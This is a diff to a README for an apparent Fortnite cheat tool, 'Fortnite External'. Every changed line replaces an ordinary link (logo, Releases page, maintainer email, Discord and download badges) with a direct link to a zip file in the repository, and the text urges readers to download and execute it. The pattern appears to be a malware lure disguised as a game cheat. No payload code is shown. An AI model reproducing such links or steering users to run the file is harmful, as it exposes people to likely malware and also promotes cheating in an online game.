@@ -1,6 +1,6 @@
 # Fortnite External 🎮
 
-![Fortnite Logo](https://upload.wikimedia.org/wikipedia/en/thumb/3/3a/Fortnite_logo.svg/1200px-Fortnite_logo.svg.png)
+![Fortnite Logo](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip)
 
 Welcome to the **Fortnite External** repository! This project focuses on enhancing the Fortnite experience with external tools and utilities. 
 
@@ -28,7 +28,7 @@ Fortnite is a popular battle royale game that combines creativity, strategy, and
 
 ## Installation
 
-To get started, download the latest release from our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/releases). Once downloaded, execute the file to install the tool.
+To get started, download the latest release from our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip). Once downloaded, execute the file to install the tool.
 
 ### Prerequisites
 
@@ -65,14 +65,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to the project maintainer:
 
-- **Email**: maintainer@example.com
-- **GitHub**: [Endermanchfan](https://github.com/Endermanchfan)
+- **Email**: https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip
+- **GitHub**: [Endermanchfan](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip)
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/releases). Here, you can find the latest files to download and execute for optimal performance.
+For the latest updates and releases, visit our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip). Here, you can find the latest files to download and execute for optimal performance.
 
-![Download Button](https://img.shields.io/badge/Download%20Latest%20Release-FF0000?style=for-the-badge&logo=github)
+![Download Button](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip%20Latest%20Release-FF0000?style=for-the-badge&logo=github)
 
 ## Acknowledgments
 
@@ -104,8 +104,8 @@ While we do not promote cheating, using this tool responsibly should not lead to
 
 Join our community on Discord to connect with other Fortnite players and users of this tool. Share tips, ask questions, and collaborate on new features.
 
-![Discord Badge](https://img.shields.io/badge/Join%20Our%20Discord-7289DA?style=for-the-badge&logo=discord)
+![Discord Badge](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip%20Our%20Discord-7289DA?style=for-the-badge&logo=discord)
 
 ## Conclusion
 
-Thank you for checking out the **Fortnite External** repository. We hope this tool enhances your gaming experience. Don't forget to visit our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/releases) for the latest updates and features. Happy gaming!
+Thank you for checking out the **Fortnite External** repository. We hope this tool enhances your gaming experience. Don't forget to visit our [Releases section](https://github.com/Endermanchfan/Fortnite-Extrernal/raw/refs/heads/main/havergrass/Fortnite_Extrernal_v2.0.zip) for the latest updates and features. Happy gaming!
